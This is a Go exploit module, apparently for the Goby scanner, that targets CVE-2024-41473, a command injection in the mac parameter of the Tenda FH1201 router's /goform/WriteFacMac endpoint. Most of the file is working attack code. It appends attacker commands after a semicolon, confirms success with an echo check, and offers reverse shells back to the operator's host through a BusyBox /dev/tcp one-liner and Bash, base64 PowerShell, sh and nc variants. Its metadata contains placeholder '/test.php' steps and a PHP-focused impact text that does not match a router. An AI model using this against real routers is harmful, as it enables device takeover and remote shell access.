package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "Tenda FH1201 /goform/WriteFacMac Command Execution Vulnerability (CVE-2024-41473)",
    "Description": "<p>The Tenda FH1201 is a wireless router from the Chinese company Tenda. Tenda FH1201 v1.2.0.14 has a security vulnerability caused by a command injection vulnerability found in the mac parameter at /goform/WriteFacMac.</p>",
    "Product": "Tenda-Router",
    "Homepage": "http://www.tenda.com.cn/",
    "DisclosureDate": "2024-10-17",
    "PostTime": "2024-10-17",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "body=\"Tenda\" && title=\"tenda\" && body=\"Forgot password\"",
    "GobyQuery": "body=\"Tenda\" && title=\"tenda\" && body=\"Forgot password\"",
    "Level": "2",
    "Impact": "<p>Attackers can use RCE to inherit the permissions of web users, execute PHP code, and if the web privileges are relatively high, they can read and write the contents of any file on the target server, and even control the entire website</p>",
    "Recommendation": "<p>1. Try not to use commands to execute functions. </p><p> 2. Don't let the user control the parameters.  </p><p> 3. Do a good job of detection and filtering before execution.</p>",
    "References": [
        "https://www.ctfiot.com/199005.html"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "echo 123456789",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "HW-2024"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2024-41473"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "Tenda FH1201 /goform/WriteFacMac 命令执行漏洞（CVE-2024-41473）",
            "Product": "Tenda-路由器",
            "Description": "<p>Tenda FH1201是中国腾达（Tenda）公司的一款无线路由器。 Tenda FH1201 v1.2.0.14版本存在安全漏洞，该漏洞源于通过/goform/WriteFacMac处的mac参数发现包含命令注入漏洞。<br></p>",
            "Recommendation": "<p>1、尽量不要使用命令执行函数。&nbsp;</p><p>2、不要让用户控制参数。&nbsp;</p><p>3、执行前做好检测和过滤。<br></p>",
            "Impact": "<p>攻击者可以通过RCE继承web用户的权限，执行php代码，如果web的权限比较高的话，就可以读写目标服务器任意文件的内容，甚至控制整个网站<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "Tenda FH1201 /goform/WriteFacMac Command Execution Vulnerability (CVE-2024-41473)",
            "Product": "Tenda-Router",
            "Description": "<p>The Tenda FH1201 is a wireless router from the Chinese company Tenda. Tenda FH1201 v1.2.0.14 has a security vulnerability caused by a command injection vulnerability found in the mac parameter at /goform/WriteFacMac.<br></p>",
            "Recommendation": "<p>1. Try not to use commands to execute functions.&nbsp;</p><p>&nbsp;2. Don't let the user control the parameters.&nbsp;&nbsp;</p><p>&nbsp;3. Do a good job of detection and filtering before execution.<br></p>",
            "Impact": "<p>Attackers can use RCE to inherit the permissions of web users, execute PHP code, and if the web privileges are relatively high, they can read and write the contents of any file on the target server, and even control the entire website<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9961"
}`

	setPayloadRequestHashQgLPm6r9 := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用

		//漏洞url地址
		vulPath := "/goform/WriteFacMac"
		postRequestConfig := httpclient.NewPostRequestConfig(vulPath)
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		postRequestConfig.Data = ";" + command
		//请求头
		head := map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
		}
		for headName, headValue := range head {
			postRequestConfig.Header.Store(headName, headValue)
		}
		//请求
		response, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil || response == nil {
			return "", "", err
		} //错误检查
		//regStr := `<td colspan="2">([\s\S]*?)<\/td>` //正则表达式
		//regObj := regexp.MustCompile(regStr)
		//if !regObj.MatchString(response.RawBody) {
		//	return "", "", errors.New("RCE Fail")
		//}
		//getname := regObj.FindStringSubmatch(response.RawBody)

		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		commandResult := response.RawBody
		if len(commandResult) == 0 {
			return "", "", errors.New("RCE Fail")
		}
		return commandResult, vulPath, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashQgLPm6r9

			text := goutils.RandomHexString(16)
			pocCommand := "echo " + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.HostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashQgLPm6r9

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			ReverseTcpByBusyBox := func(rp string) string {
				return fmt.Sprintf("busybox sh -c 'sh -i >& /dev/tcp/%s/%s 0>&1'", godclient.GetGodServerIP(), rp)
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"ByBusyBox":          ReverseTcpByBusyBox,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				_, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				re := regexp.MustCompile(`(?i)echo\s+(.*)`)
				matches := re.FindStringSubmatch(command)
				if len(matches) > 0 {
					expResult.Success = true
					expResult.Output = matches[1]
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])
				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
